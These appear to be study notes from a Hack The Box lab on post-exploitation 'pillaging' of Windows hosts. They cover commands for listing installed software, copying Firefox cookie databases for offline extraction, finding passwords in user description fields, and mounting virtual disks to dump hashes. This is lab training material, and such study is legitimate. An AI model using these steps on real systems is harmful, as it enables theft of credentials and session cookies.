Pillaging is the technique to enumerate for information about our target or information that is useful to us.

Below are some of the sources from which we can obtain information from compromised systems:

- Installed applications
- Installed services
    - Websites
    - File Shares
    - Databases
    - Directory Services (such as Active Directory, Azure AD, etc.)
    - Name Servers
    - Deployment Services
    - Certificate Authority
    - Source Code Management Server
    - Virtualization
    - Messaging
    - Monitoring and Logging Systems
    - Backups
- Sensitive Data
    - Keylogging
    - Screen Capture
    - Network Traffic Capture
    - Previous Audit reports
- User Information
    - History files, interesting documents (.doc/x,.xls/x,password._/pass._, etc)
    - Roles and Privileges
    - Web Browsers
    - IM Clients

We can find installed application in these following 2 ways:
```
dir "C:\Program Files"
```

```
PS C:\htb> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
```

We can also extract cookies from firefox by using the following command:
```
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

Then, we use https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py on our local machine to extract cookies:

```
python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

Finding User Credential in Description field:

Sometimes, sysadmin may store account details in a computer or user account's description field, we can enumerate them using the Get-LocalUser cmdlet in PowerShell:
```
PS C:\htb> Get-LocalUser
 
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password: 6e148516kex!
sql_dev         True
```

Using Get-WmiObject, we can get Computer Description Field:
```
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
 
Description
-----------
The most vulnerable box ever!
```

Information Hunting by Mounting VHDX / VMDK:

`.vhd`, `.vhdx`, and `.vmdk` are virtual harddisk files, if they are found during our operation, we can mount them on our system to enumerate information:

On Linux (VMDK):
```
Avalon112@htb[/htb]$ guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

On Linux (VHD/VHDX):
```
Avalon112@htb[/htb]$ guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

On windows, we can simply right click the file and select mount or use the Disk Management utility, or use Mount-VHD cmdlet, if the VHD/VHDX/VMDK file we found is backup of a live system, this could lead to a easy win as now we can directly dump hashes using secretsdump


The following Parts are skipped, however if we encounter the same item we it might be of our interest to visit https://academy.hackthebox.com/app/module/67/section/1637 again for more information: mRemoteNG, restic, slack

